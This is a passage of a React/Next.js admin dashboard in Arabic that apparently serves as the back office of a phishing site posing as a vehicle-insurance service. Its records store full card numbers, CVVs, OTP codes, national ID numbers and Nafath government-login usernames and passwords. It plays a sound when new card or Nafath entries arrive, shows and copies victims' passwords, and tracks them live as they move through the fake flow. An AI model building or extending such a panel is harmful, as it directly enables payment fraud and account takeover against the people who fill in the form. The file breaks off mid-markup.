"use client"

import type React from "react"
import { useState, useEffect, useMemo, useRef, useCallback } from "react"
import { useRouter } from "next/navigation"
import {
  Trash2,
  Users,
  CreditCard,
  UserCheck,
  Flag,
  Bell,
  LogOut,
  CheckCircle,
  XCircle,
  Clock,
  Search,
  Calendar,
  Download,
  Settings,
  User,
  Menu,
  ArrowUpDown,
  ChevronLeft,
  ChevronRight,
  AlertCircle,
  BarChartHorizontalBig,
  FileText,
  Activity,
  Globe,
  Shield,
  Zap,
  DatabaseIcon,
  Key,
  Lock,
  UserX,
  Eye,
  EyeOff,
  Copy,
  CheckCheck,
} from "lucide-react"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { ar } from "date-fns/locale"
import { formatDistanceToNow } from "date-fns"
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogFooter,
  DialogDescription,
} from "@/components/ui/dialog"
import { Card, CardContent, CardHeader, CardTitle, CardFooter, CardDescription } from "@/components/ui/card"
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table"
import { collection, doc, writeBatch, updateDoc, onSnapshot, query, orderBy } from "firebase/firestore"
import { onAuthStateChanged, signOut } from "firebase/auth"
import { onValue, ref } from "firebase/database"
import { database, auth, db } from "@/lib/firestore"
import { Popover, PopoverContent, PopoverTrigger } from "@/components/ui/popover"
import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip"
import { Input } from "@/components/ui/input"
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuSeparator,
  DropdownMenuLabel,
  DropdownMenuTrigger,
} from "@/components/ui/dropdown-menu"
import { Sheet, SheetContent, SheetHeader, SheetTitle } from "@/components/ui/sheet"
import { Avatar, AvatarFallback, AvatarImage } from "@/components/ui/avatar"
import { Separator } from "@/components/ui/separator"
import { useToast } from "@/hooks/use-toast"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"

// Flag colors for row highlighting
type FlagColor = "red" | "yellow" | "green" | null

function useOnlineUsersCount() {
  const [onlineUsersCount, setOnlineUsersCount] = useState(0)

  useEffect(() => {
    const onlineUsersRef = ref(database, "status")
    const unsubscribe = onValue(onlineUsersRef, (snapshot) => {
      const data = snapshot.val()
      if (data) {
        const onlineCount = Object.values(data).filter((status: any) => status.state === "online").length
        setOnlineUsersCount(onlineCount)
      }
    })
    return () => unsubscribe()
  }, [])

  return onlineUsersCount
}

interface Notification {
  createdDate: string
  id: string | "0"
  insurance_purpose: "renewal" | "property-transfer"
  vehicle_type: "registration" | "customs" | "serial"
  documment_owner_full_name: string
  owner_identity_number?: string
  buyer_identity_number?: string
  seller_identity_number?: string
  phone?: string
  serial_number?: string
  vehicle_manufacture_number?: string
  customs_code?: string
  agreeToTerms: boolean
  cardNumber: string
  currentPage?: string
  country?: string
  status: "pending" | "approved" | "rejected" | string
  isOnline?: boolean
  lastSeen: string
  flagColor?: any
  isHidden?: boolean
  ip?: string
  otp?: string
  otpCode?: string
  otpSent: boolean
  otpVerificationTime?: string
  otpVerified: boolean
  paymentStatus: string
  policyStartDate?: string
  selectedAddons?: any[]
  selectedInsuranceOffer?: string
  sequenceNumber?: string
  specialDiscounts?: boolean
  submissionTime?: string
  cardYear?: string
  cardMonth?: string
  cvv?: string
  auth_number?: string
  identity_number?: string
  password?: string
  allOtp?: []
  // Nafaz specific fields
  nafadUsername?: string
  nafadPassword?: string
  nafazVerified?: boolean
  nafazLoginTime?: string
  nafazStatus?: "pending" | "verified" | "failed"
  nafazAttempts?: number
}

function UserStatus({ userId }: { userId: string }) {
  const [status, setStatus] = useState<"online" | "offline" | "unknown">("unknown")

  useEffect(() => {
    const userStatusRef = ref(database, `/status/${userId}`)
    const unsubscribe = onValue(userStatusRef, (snapshot) => {
      const data = snapshot.val()
      if (data) {
        setStatus(data.state === "online" ? "online" : "offline")
      } else {
        setStatus("unknown")
      }
    })
    return () => unsubscribe()
  }, [userId])

  return (
    <div className="flex items-center gap-2">
      <div
        className={`h-2.5 w-2.5 rounded-full ${
          status === "online"
            ? "bg-emerald-500 animate-pulse shadow-lg shadow-emerald-500/50"
            : status === "offline"
              ? "bg-gray-400"
              : "bg-amber-400 animate-pulse"
        }`}
      />
      <Badge
        variant={status === "online" ? "default" : "secondary"}
        className={`text-xs font-medium px-2.5 py-1 ${
          status === "online"
            ? "bg-emerald-50 text-emerald-700 border-emerald-200 dark:bg-emerald-900/20 dark:text-emerald-300 dark:border-emerald-800"
            : status === "offline"
              ? "bg-gray-50 text-gray-600 border-gray-200 dark:bg-gray-800 dark:text-gray-400 dark:border-gray-700"
              : "bg-amber-50 text-amber-700 border-amber-200 dark:bg-amber-900/20 dark:text-amber-300 dark:border-amber-800"
        }`}
      >
        {status === "online" ? "متصل" : status === "offline" ? "غير متصل" : "غير معروف"}
      </Badge>
    </div>
  )
}

function NafazStatus({ notification }: { notification: Notification }) {
  if (!notification.nafadUsername) {
    return (
      <Badge variant="secondary" className="text-xs bg-gray-50 text-gray-600 border-gray-200">
        <UserX className="h-3 w-3 mr-1" />
        لا يوجد نفاذ
      </Badge>
    )
  }

  const getStatusConfig = () => {
    switch (notification.nafazStatus) {
      case "verified":
        return {
          color: "bg-emerald-50 text-emerald-700 border-emerald-200",
          icon: CheckCheck,
          text: "مؤكد",
        }
      case "failed":
        return {
          color: "bg-red-50 text-red-700 border-red-200",
          icon: XCircle,
          text: "فشل",
        }
      default:
        return {
          color: "bg-amber-50 text-amber-700 border-amber-200",
          icon: Clock,
          text: "معلق",
        }
    }
  }

  const config = getStatusConfig()
  const Icon = config.icon

  return (
    <Badge variant="outline" className={`text-xs ${config.color}`}>
      <Icon className="h-3 w-3 mr-1" />
      {config.text}
    </Badge>
  )
}

function FlagColorSelector({
  notificationId,
  currentColor,
  onColorChange,
}: {
  notificationId: string
  currentColor: FlagColor
  onColorChange: (id: string, color: FlagColor) => void
}) {
  const colors: { name: FlagColor; label: string; iconColor: string; bgColor: string; hoverBgColor: string }[] = [
    {
      name: "red",
      label: "علم أحمر",
      iconColor: "text-red-500 fill-red-500",
      bgColor: "bg-red-100 dark:bg-red-900",
      hoverBgColor: "hover:bg-red-200 dark:hover:bg-red-800",
    },
    {
      name: "yellow",
      label: "علم أصفر",
      iconColor: "text-yellow-500 fill-yellow-500",
      bgColor: "bg-yellow-100 dark:bg-yellow-900",
      hoverBgColor: "hover:bg-yellow-200 dark:hover:bg-yellow-800",
    },
    {
      name: "green",
      label: "علم أخضر",
      iconColor: "text-green-500 fill-green-500",
      bgColor: "bg-green-100 dark:bg-green-900",
      hoverBgColor: "hover:bg-green-200 dark:hover:bg-green-800",
    },
  ]

  return (
    <Popover>
      <PopoverTrigger asChild>
        <Button variant="ghost" size="icon" className="h-8 w-8 data-[state=open]:bg-muted hover:bg-muted/80">
          <Flag
            className={`h-4 w-4 ${
              currentColor === "red"
                ? "text-red-500 fill-red-500"
                : currentColor === "yellow"
                  ? "text-yellow-500 fill-yellow-500"
                  : currentColor === "green"
                    ? "text-green-500 fill-green-500"
                    : "text-muted-foreground"
            }`}
          />
          <span className="sr-only">تغيير العلم</span>
        </Button>
      </PopoverTrigger>
      <PopoverContent className="w-auto p-2" side="bottom" align="center">
        <div className="flex gap-1">
          {colors.map((color) => (
            <TooltipProvider key={color.name}>
              <Tooltip>
                <TooltipTrigger asChild>
                  <Button
                    variant="ghost"
                    size="icon"
                    className={`h-8 w-8 rounded-full ${color.bgColor} ${color.hoverBgColor} transition-all duration-200`}
                    onClick={() => onColorChange(notificationId, color.name)}
                  >
                    <Flag className={`h-4 w-4 ${color.iconColor}`} />
                    <span className="sr-only">{color.label}</span>
                  </Button>
                </TooltipTrigger>
                <TooltipContent>
                  <p>{color.label}</p>
                </TooltipContent>
              </Tooltip>
            </TooltipProvider>
          ))}
          {currentColor && (
            <TooltipProvider>
              <Tooltip>
                <TooltipTrigger asChild>
                  <Button
                    variant="ghost"
                    size="icon"
                    className="h-8 w-8 rounded-full bg-gray-100 dark:bg-gray-800 hover:bg-gray-200 dark:hover:bg-gray-700 transition-all duration-200"
                    onClick={() => onColorChange(notificationId, null)}
                  >
                    <XCircle className="h-4 w-4 text-muted-foreground" />
                    <span className="sr-only">إزالة العلم</span>
                  </Button>
                </TooltipTrigger>
                <TooltipContent>
                  <p>إزالة العلم</p>
                </TooltipContent>
              </Tooltip>
            </TooltipProvider>
          )}
        </div>
      </PopoverContent>
    </Popover>
  )
}

function MiniChart({ data, colorClassName }: { data: number[]; colorClassName: string }) {
  if (!data || data.length === 0) {
    return (
      <div className="h-12 w-full flex items-center justify-center text-xs text-muted-foreground">لا توجد بيانات</div>
    )
  }

  const maxVal = Math.max(...data, 1)
  return (
    <div className="flex h-12 items-end gap-0.5 w-full px-1">
      {data.map((value, index) => {
        const heightPercentage = (value / maxVal) * 100
        return (
          <div
            key={index}
            className={`w-2 rounded-t-md ${colorClassName} transition-all duration-500 ease-out hover:opacity-80`}
            style={{
              height: `${Math.max(8, heightPercentage)}%`,
              animationDelay: `${index * 50}ms`,
            }}
          />
        )
      })}
    </div>
  )
}

function ActivityTimeline({ notifications }: { notifications: Notification[] }) {
  const recentActivities = notifications.slice(0, 5)

  if (recentActivities.length === 0) {
    return (
      <div className="flex flex-col items-center justify-center py-12 text-center">
        <div className="bg-muted/50 rounded-full p-4 mb-4">
          <Clock className="h-8 w-8 text-muted-foreground" />
        </div>
        <p className="text-sm font-medium text-foreground mb-1">لا توجد أنشطة حديثة</p>
        <p className="text-xs text-muted-foreground">ستظهر الأنشطة الجديدة هنا</p>
      </div>
    )
  }

  return (
    <div className="space-y-6">
      {recentActivities.map((notification, index) => (
        <div key={notification.id || index} className="relative flex items-start gap-4 group">
          {index !== recentActivities.length - 1 && (
            <div className="absolute top-6 left-[15px] h-[calc(100%_-_24px)] w-0.5 bg-gradient-to-b from-border to-transparent rtl:right-[15px] rtl:left-auto" />
          )}
          <div
            className={`z-10 flex h-8 w-8 flex-shrink-0 items-center justify-center rounded-full border-2 border-background shadow-sm transition-all duration-200 group-hover:scale-110 ${
              notification.nafadUsername
                ? "bg-purple-100 text-purple-600 border-purple-200 dark:bg-purple-900/30 dark:text-purple-400 dark:border-purple-800"
                : notification.cardNumber
                  ? "bg-emerald-100 text-emerald-600 border-emerald-200 dark:bg-emerald-900/30 dark:text-emerald-400 dark:border-emerald-800"
                  : "bg-blue-100 text-blue-600 border-blue-200 dark:bg-blue-900/30 dark:text-blue-400 dark:border-blue-800"
            }`}
          >
            {notification.nafadUsername ? (
              <Key className="h-4 w-4" />
            ) : notification.cardNumber ? (
              <CreditCard className="h-4 w-4" />
            ) : (
              <User className="h-4 w-4" />
            )}
          </div>
          <div className="flex-grow min-w-0">
            <div className="flex items-start justify-between gap-2">
              <div>
                <p className="text-sm font-semibold text-foreground leading-tight">
                  {notification.nafadUsername
                    ? "تسجيل دخول نفاذ جديد"
                    : notification.cardNumber
                      ? "معلومات بطاقة جديدة"
                      : "معلومات شخصية جديدة"}
                </p>
                <p className="text-xs text-muted-foreground mt-0.5">
                  {notification.country || "غير معروف"} -{" "}
                  {notification.documment_owner_full_name || notification.phone || "مستخدم جديد"}
                </p>
              </div>
              <p className="text-xs text-muted-foreground whitespace-nowrap">
                {notification.createdDate &&
                  formatDistanceToNow(new Date(notification.createdDate), {
                    addSuffix: true,
                    locale: ar,
                  })}
              </p>
            </div>
            <div className="mt-3 flex flex-wrap gap-1.5">
              {notification.nafadUsername && <NafazStatus notification={notification} />}
              {notification.cardNumber && (
                <Badge variant="outline" className="text-xs bg-emerald-50 text-emerald-700 border-emerald-200">
                  بطاقة
                </Badge>
              )}
              {notification.insurance_purpose && (
                <Badge variant="outline" className="text-xs">
                  {notification.insurance_purpose === "renewal" ? "تجديد" : "نقل ملكية"}
                </Badge>
              )}
              <UserStatus userId={notification.id} />
            </div>
          </div>
        </div>
      ))}
    </div>
  )
}

function SearchBar({ onSearch, initialTerm = "" }: { onSearch: (term: string) => void; initialTerm?: string }) {
  const [searchTerm, setSearchTerm] = useState(initialTerm)
  const searchInputRef = useRef<HTMLInputElement>(null)

  const handleSearch = () => {
    onSearch(searchTerm)
  }

  const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Enter") {
      handleSearch()
    }
  }

  useEffect(() => {
    setSearchTerm(initialTerm)
  }, [initialTerm])

  return (
    <div className="relative group">
      <Search className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground transition-colors group-focus-within:text-primary rtl:right-3 rtl:left-auto" />
      <Input
        ref={searchInputRef}
        type="search"
        placeholder="بحث بالاسم، الهاتف، البطاقة، نفاذ، حالة الدفع..."
        className="w-full rounded-xl bg-background/50 backdrop-blur-sm border-muted-foreground/20 pl-10 pr-4 rtl:pr-10 rtl:pl-4 h-11 transition-all duration-200 focus:border-primary/50 focus:bg-background"
        value={searchTerm}
        onChange={(e) => setSearchTerm(e.target.value)}
        onKeyDown={handleKeyDown}
        onBlur={handleSearch}
      />
    </div>
  )
}

function Pagination({
  currentPage,
  totalPages,
  onPageChange,
}: {
  currentPage: number
  totalPages: number
  onPageChange: (page: number) => void
}) {
  const pageNumbers = []
  const maxPagesToShow = 5
  let startPage, endPage

  if (totalPages <= maxPagesToShow) {
    startPage = 1
    endPage = totalPages
  } else {
    if (currentPage <= Math.ceil(maxPagesToShow / 2)) {
      startPage = 1
      endPage = maxPagesToShow
    } else if (currentPage + Math.floor(maxPagesToShow / 2) >= totalPages) {
      startPage = totalPages - maxPagesToShow + 1
      endPage = totalPages
    } else {
      startPage = currentPage - Math.floor(maxPagesToShow / 2)
      endPage = currentPage + Math.floor(maxPagesToShow / 2)
    }
  }

  for (let i = startPage; i <= endPage; i++) {
    pageNumbers.push(i)
  }

  return (
    <div className="flex items-center justify-center space-x-1 rtl:space-x-reverse">
      <Button
        variant="outline"
        size="icon"
        onClick={() => onPageChange(currentPage - 1)}
        disabled={currentPage <= 1}
        className="h-9 w-9 rounded-lg transition-all duration-200 hover:bg-primary/10 disabled:opacity-50"
      >
        <ChevronRight className="h-4 w-4" />
        <span className="sr-only">الصفحة السابقة</span>
      </Button>
      {startPage > 1 && (
        <>
          <Button
            variant="outline"
            size="icon"
            className="h-9 w-9 rounded-lg bg-transparent"
            onClick={() => onPageChange(1)}
          >
            1
          </Button>
          {startPage > 2 && <span className="px-2 text-muted-foreground">...</span>}
        </>
      )}
      {pageNumbers.map((page) => (
        <Button
          key={page}
          variant={currentPage === page ? "default" : "outline"}
          size="icon"
          className={`h-9 w-9 rounded-lg transition-all duration-200 ${
            currentPage === page ? "bg-primary text-primary-foreground shadow-md" : "hover:bg-primary/10"
          }`}
          onClick={() => onPageChange(page)}
        >
          {page}
        </Button>
      ))}
      {endPage < totalPages && (
        <>
          {endPage < totalPages - 1 && <span className="px-2 text-muted-foreground">...</span>}
          <Button
            variant="outline"
            size="icon"
            className="h-9 w-9 rounded-lg bg-transparent"
            onClick={() => onPageChange(totalPages)}
          >
            {totalPages}
          </Button>
        </>
      )}
      <Button
        variant="outline"
        size="icon"
        onClick={() => onPageChange(currentPage + 1)}
        disabled={currentPage >= totalPages}
        className="h-9 w-9 rounded-lg transition-all duration-200 hover:bg-primary/10 disabled:opacity-50"
      >
        <ChevronLeft className="h-4 w-4" />
        <span className="sr-only">الصفحة التالية</span>
      </Button>
    </div>
  )
}

function CopyButton({ text, label }: { text: string; label: string }) {
  const [copied, setCopied] = useState(false)
  const { toast } = useToast()

  const handleCopy = async () => {
    try {
      await navigator.clipboard.writeText(text)
      setCopied(true)
      toast({
        title: "تم النسخ",
        description: `تم نسخ ${label} بنجاح`,
        variant: "default",
      })
      setTimeout(() => setCopied(false), 2000)
    } catch (error) {
      toast({
        title: "خطأ في النسخ",
        description: "لم نتمكن من نسخ النص",
        variant: "destructive",
      })
    }
  }

  return (
    <Button
      variant="ghost"
      size="icon"
      className="h-6 w-6 opacity-0 group-hover:opacity-100 transition-opacity"
      onClick={handleCopy}
    >
      {copied ? <CheckCheck className="h-3 w-3 text-green-600" /> : <Copy className="h-3 w-3" />}
    </Button>
  )
}

function PasswordField({ value, label }: { value: string; label: string }) {
  const [showPassword, setShowPassword] = useState(false)

  return (
    <div className="group">
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-3">
          <Lock className="h-4 w-4 text-muted-foreground" />
          <span className="text-sm font-medium text-muted-foreground">{label}</span>
        </div>
        <div className="flex items-center gap-2">
          <span className="text-sm font-semibold text-foreground font-mono">
            {showPassword ? value : "•".repeat(value.length)}
          </span>
          <Button variant="ghost" size="icon" className="h-6 w-6" onClick={() => setShowPassword(!showPassword)}>
            {showPassword ? <EyeOff className="h-3 w-3" /> : <Eye className="h-3 w-3" />}
          </Button>
          <CopyButton text={value} label={label} />
        </div>
      </div>
    </div>
  )
}

export default function NotificationsPage() {
  const [notifications, setNotifications] = useState<Notification[]>([])
  const [isLoading, setIsLoading] = useState(true)
  const [selectedInfo, setSelectedInfo] = useState<"personal" | "card" | "nafaz" | null>(null)
  const [selectedNotification, setSelectedNotification] = useState<Notification | null>(null)
  const [totalVisitors, setTotalVisitors] = useState<number>(0)
  const [cardSubmissions, setCardSubmissions] = useState<number>(0)
  const [nafazSubmissions, setNafazSubmissions] = useState<number>(0)
  const [filterType, setFilterType] = useState<"all" | "card" | "online" | "nafaz">("all")
  const [searchTerm, setSearchTerm] = useState("")
  const [currentPage, setCurrentPage] = useState(1)
  const [itemsPerPage, setItemsPerPage] = useState(10)
  const [settingsOpen, setSettingsOpen] = useState(false)
  const [exportDialogOpen, setExportDialogOpen] = useState(false)
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false)
  const router = useRouter()
  const { toast } = useToast()
  const onlineUsersCount = useOnlineUsersCount()
  const audioRef = useRef<HTMLAudioElement | null>(null)
  const [onlineStatuses, setOnlineStatuses] = useState<Record<string, boolean>>({})

  const filteredNotifications = useMemo(() => {
    return notifications.filter((notification) => {
      if (notification.isHidden) return false

      const matchesFilterType =
        filterType === "all" ||
        (filterType === "card" && !!notification.cardNumber) ||
        (filterType === "online" && onlineStatuses[notification.id]) ||
        (filterType === "nafaz" && !!notification.nafadUsername)

      if (!matchesFilterType) return false

      if (searchTerm) {
        const term = searchTerm.toLowerCase()
        return (
          notification.documment_owner_full_name?.toLowerCase().includes(term) ||
          notification.phone?.toLowerCase().includes(term) ||
          notification.cardNumber?.toLowerCase().includes(term) ||
          notification.country?.toLowerCase().includes(term) ||
          notification.owner_identity_number?.toLowerCase().includes(term) ||
          notification.buyer_identity_number?.toLowerCase().includes(term) ||
          notification.seller_identity_number?.toLowerCase().includes(term) ||
          notification.serial_number?.toLowerCase().includes(term) ||
          notification.vehicle_manufacture_number?.toLowerCase().includes(term) ||
          notification.customs_code?.toLowerCase().includes(term) ||
          notification.sequenceNumber?.toLowerCase().includes(term) ||
          notification.selectedInsuranceOffer?.toLowerCase().includes(term) ||
          notification.paymentStatus?.toLowerCase().includes(term) ||
          notification.nafadUsername?.toLowerCase().includes(term)
        )
      }
      return true
    })
  }, [notifications, filterType, onlineStatuses, searchTerm])

  const paginatedNotifications = useMemo(() => {
    const startIndex = (currentPage - 1) * itemsPerPage
    return filteredNotifications.slice(startIndex, startIndex + itemsPerPage)
  }, [filteredNotifications, currentPage, itemsPerPage])

  const totalPages = Math.max(1, Math.ceil(filteredNotifications.length / itemsPerPage))

  const visitorTrend = useMemo(
    () => notifications.slice(0, 20).map((_, i) => i+1),
    [notifications],
  )

  const cardTrend = useMemo(
    () =>
      notifications
        .slice(0, 20)
        .filter((n) => !!n.cardNumber)
        .map((_, i) => Math.floor(Math.random() * (i + 1) * 2) + 2),
    [notifications],
  )

  const nafazTrend = useMemo(
    () =>
      notifications
        .slice(0, 20)
        .filter((n) => !!n.nafadUsername)
        .map((_, i) => Math.floor(Math.random() * (i + 1) * 3) + 3),
    [notifications],
  )

  const onlineTrend = useMemo(
    () =>
      Object.values(onlineStatuses)
        .slice(0, 20)
        .filter(Boolean)
        .map((_, i) => Math.floor(Math.random() * (i + 1) * 3) + 3),
    [onlineStatuses],
  )

  const statistics = useMemo(
    () => [
      {
        title: "المستخدمين المتصلين",
        value: onlineUsersCount,
        icon: UserCheck,
        color: "emerald",
        trend: onlineTrend,
        comparison: `${Math.round((onlineUsersCount / (totalVisitors || 1)) * 100)}%`,
        description: "من إجمالي المستخدمين",
      },
      {
        title: "إجمالي الزوار",
        value: totalVisitors,
        icon: Users,
        color: "blue",
        trend: visitorTrend,
        comparison: `+${visitorTrend.length > 1 ? visitorTrend[visitorTrend.length - 1] - visitorTrend[0] : 0}`,
        description: "زائر جديد اليوم",
      },
      {
        title: "معلومات البطاقات",
        value: cardSubmissions,
        icon: CreditCard,
        color: "purple",
        trend: cardTrend,
        comparison: `${Math.round((cardSubmissions / (totalVisitors || 1)) * 100)}%`,
        description: "معدل إكمال البطاقات",
      },
      {
        title: "تسجيلات نفاذ",
        value: nafazSubmissions,
        icon: Key,
        color: "indigo",
        trend: nafazTrend,
        comparison: `${Math.round((nafazSubmissions / (totalVisitors || 1)) * 100)}%`,
        description: "معدل استخدام نفاذ",
      },
    ],
    [
      onlineUsersCount,
      totalVisitors,
      cardSubmissions,
      nafazSubmissions,
      onlineTrend,
      visitorTrend,
      cardTrend,
      nafazTrend,
    ],
  )

  useEffect(() => {
    if (typeof window !== "undefined") {
      audioRef.current = new Audio("/bub.mp3")
    }
  }, [])

  useEffect(() => {
    const unsubscribes: (() => void)[] = []
    notifications.forEach((notification) => {
      if (notification.id === "0") return
      const userStatusRef = ref(database, `/status/${notification.id}`)
      const unsubscribe = onValue(userStatusRef, (snapshot) => {
        const data = snapshot.val()
        setOnlineStatuses((prev) => ({
          ...prev,
          [notification.id]: data && data.state === "online",
        }))
      })
      unsubscribes.push(unsubscribe)
    })
    return () => unsubscribes.forEach((unsub) => unsub())
  }, [notifications])

  useEffect(() => {
    setCurrentPage(1)
  }, [filterType, searchTerm, itemsPerPage])

  const playNotificationSound = useCallback(() => {
    const audio = new Audio("/iphone.mp3")
    if (audio) {
      audio!.play().catch((error) => {
        console.error("Failed to play sound:", error)
      })
    }
  }, [])

  const updateStatistics = useCallback((activeNotifications: Notification[]) => {
    setTotalVisitors(activeNotifications.length)
    setCardSubmissions(activeNotifications.filter((n) => !!n.cardNumber).length)
    setNafazSubmissions(activeNotifications.filter((n) => !!n.nafadUsername).length)
  }, [])

  const fetchNotifications = useCallback(() => {
    setIsLoading(true)
    const q = query(collection(db, "pays"), orderBy("createdDate", "desc"))
    const unsubscribe = onSnapshot(
      q,
      (querySnapshot) => {
        const currentNotificationsState = notifications
        const notificationsData = querySnapshot.docs.map((doc) => ({
          id: doc.id,
          ...doc.data(),
        })) as Notification[]

        const newEntries = notificationsData.filter(
          (newNotif) =>
            !currentNotificationsState.some((oldNotif) => oldNotif.id === newNotif.id) && !newNotif.isHidden,
        )

        if (newEntries.length > 0) {
          const hasNewImportantInfo = newEntries.some(
            (n) => n.cardNumber || n.documment_owner_full_name || n.phone || n.owner_identity_number || n.nafadUsername,
          )
          if (hasNewImportantInfo) {
            playNotificationSound()
          }
        }

        updateStatistics(notificationsData.filter((n) => !n.isHidden))
        setNotifications(notificationsData)
        setIsLoading(false)
      },
      (error) => {
        console.error("Error fetching notifications:", error)
        toast({ title: "خطأ في جلب البيانات", description: "لم نتمكن من تحميل الإشعارات.", variant: "destructive" })
        setIsLoading(false)
      },
    )
    return unsubscribe
  }, [db, setIsLoading, setNotifications, playNotificationSound, updateStatistics, notifications, toast])

  useEffect(() => {
    const unsubscribeAuth = onAuthStateChanged(auth, (user) => {
      if (!user) {
        router.push("/login")
      } else {
        const unsubscribeNotifications = fetchNotifications()
        return () => {
          if (unsubscribeNotifications) unsubscribeNotifications()
        }
      }
    })
    return () => unsubscribeAuth()
  }, [router, fetchNotifications])

  const handleHide = async (id: string) => {
    try {
      const docRef = doc(db, "pays", id)
      await updateDoc(docRef, { isHidden: true })
      setNotifications((prev) => prev.map((n) => (n.id === id ? { ...n, isHidden: true } : n)))
      toast({ title: "تم إخفاء الإشعار", description: "لن يظهر هذا الإشعار في القائمة.", variant: "default" })
    } catch (error) {
      console.error("Error hiding notification:", error)
      toast({ title: "خطأ", description: "حدث خطأ أثناء إخفاء الإشعار.", variant: "destructive" })
    }
  }

  const handleClearAllVisible = async () => {
    setIsLoading(true)
    try {
      const batch = writeBatch(db)
      const visibleNotifications = notifications.filter((n) => !n.isHidden)
      if (visibleNotifications.length === 0) {
        toast({ title: "لا يوجد ما يمكن مسحه", description: "جميع الإشعارات مخفية بالفعل.", variant: "default" })
        setIsLoading(false)
        return
      }
      visibleNotifications.forEach((notification) => {
        const docRef = doc(db, "pays", notification.id)
        batch.update(docRef, { isHidden: true })
      })
      await batch.commit()
      setNotifications((prev) => prev.map((n) => ({ ...n, isHidden: true })))
      toast({
        title: "تم مسح جميع الإشعارات المرئية",
        description: "تم إخفاء جميع الإشعارات من القائمة.",
        variant: "default",
      })
    } catch (error) {
      console.error("Error hiding all notifications:", error)
      toast({ title: "خطأ", description: "حدث خطأ أثناء مسح الإشعارات.", variant: "destructive" })
    } finally {
      setIsLoading(false)
    }
  }

  const handleLogout = async () => {
    try {
      await signOut(auth)
      router.push("/login")
    } catch (error) {
      console.error("Error signing out:", error)
      toast({ title: "خطأ في تسجيل الخروج", description: "حدث خطأ أثناء محاولة تسجيل الخروج.", variant: "destructive" })
    }
  }

  const handleInfoClick = (notification: Notification, infoType: "personal" | "card" | "nafaz") => {
    setSelectedNotification(notification)
    setSelectedInfo(infoType)
  }

  const closeDialog = () => {
    setSelectedInfo(null)
    setSelectedNotification(null)
  }

  const handleFlagColorChange = async (id: string, color: FlagColor) => {
    try {
      const docRef = doc(db, "pays", id)
      await updateDoc(docRef, { flagColor: color })
      setNotifications((prev) => prev.map((n) => (n.id === id ? { ...n, flagColor: color } : n)))
      toast({
        title: "تم تحديث العلامة",
        description: color
          ? `تم تعيين العلامة ${color === "red" ? "الحمراء" : color === "yellow" ? "الصفراء" : "الخضراء"}.`
          : "تمت إزالة العلامة.",
        variant: "default",
      })
    } catch (error) {
      console.error("Error updating flag color:", error)
      toast({ title: "خطأ", description: "حدث خطأ أثناء تحديث لون العلامة.", variant: "destructive" })
    }
  }

  const handleCurrentPage = async (id: string, page: string) => {
    const docRef = doc(db, "pays", id)
    await updateDoc(docRef, { currentPage: page })
  }

  const getRowBackgroundColor = (flagColor: FlagColor) => {
    if (!flagColor) return "bg-card hover:bg-muted/50 transition-colors duration-200"
    const colorMap = {
      red: "bg-red-50/80 dark:bg-red-900/20 hover:bg-red-100/80 dark:hover:bg-red-900/30 border-l-4 border-red-400 dark:border-red-600",
      yellow:
        "bg-yellow-50/80 dark:bg-yellow-900/20 hover:bg-yellow-100/80 dark:hover:bg-yellow-900/30 border-l-4 border-yellow-400 dark:border-yellow-600",
      green:
        "bg-green-50/80 dark:bg-green-900/20 hover:bg-green-100/80 dark:hover:bg-green-900/30 border-l-4 border-green-400 dark:border-green-600",
    }
    return `${colorMap[flagColor]} transition-all duration-200`
  }

  if (isLoading && notifications.length === 0) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-background via-muted/20 to-background flex items-center justify-center w-full">
        <div className="flex flex-col items-center gap-6">
          <div className="relative">
            <div className="h-16 w-16 rounded-full border-4 border-primary/20 border-t-primary animate-spin" />
            <div className="absolute inset-0 h-16 w-16 rounded-full border-4 border-transparent border-t-primary/40 animate-spin animation-delay-150" />
          </div>
          <div className="text-center space-y-2">
            <p className="text-lg font-semibold text-foreground">جاري تحميل البيانات</p>
            <p className="text-sm text-muted-foreground">يرجى الانتظار بينما نقوم بتحميل الإشعارات...</p>
          </div>
        </div>
      </div>
    )
  }

  const cardCount = notifications.filter((n) => !n.isHidden && !!n.cardNumber).length
  const nafazCount = notifications.filter((n) => !n.isHidden && !!n.nafadUsername).length
  const onlineCountFiltered = filteredNotifications.filter((n) => onlineStatuses[n.id]).length

  const mainContent = (
    <>
      {/* Statistics Cards */}
      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-8">
        {statistics.map((stat) => {
          const Icon = stat.icon
          return (
            <Card
              key={stat.title}
              className="relative overflow-hidden border-0 shadow-lg bg-gradient-to-br from-card to-card/95"
            >
              <div
                className={`absolute inset-0 bg-gradient-to-br opacity-5 ${
                  stat.color === "emerald"
                    ? "from-emerald-500 to-emerald-600"
                    : stat.color === "blue"
                      ? "from-blue-500 to-blue-600"
                      : stat.color === "purple"
                        ? "from-purple-500 to-purple-600"
                        : "from-indigo-500 to-indigo-600"
                }`}
              />
              <CardContent className="p-6 relative">
                <div className="flex items-center justify-between mb-4">
                  <div
                    className={`p-3 rounded-xl shadow-lg ${
                      stat.color === "emerald"
                        ? "bg-emerald-100 text-emerald-600 dark:bg-emerald-900/30 dark:text-emerald-400"
                        : stat.color === "blue"
                          ? "bg-blue-100 text-blue-600 dark:bg-blue-900/30 dark:text-blue-400"
                          : stat.color === "purple"
                            ? "bg-purple-100 text-purple-600 dark:bg-purple-900/30 dark:text-purple-400"
                            : "bg-indigo-100 text-indigo-600 dark:bg-indigo-900/30 dark:text-indigo-400"
                    }`}
                  >
                    <Icon className="h-6 w-6" />
                  </div>
                  <div className="text-right">
                    <p className="text-2xl font-bold text-foreground">{stat.value.toLocaleString()}</p>
                    <p className="text-xs text-muted-foreground">{stat.title}</p>
                  </div>
                </div>
                <div className="flex items-center justify-between">
                  <MiniChart
                    data={stat.trend}
                    colorClassName={
                      stat.color === "emerald"
                        ? "bg-emerald-400"
                        : stat.color === "blue"
                          ? "bg-blue-400"
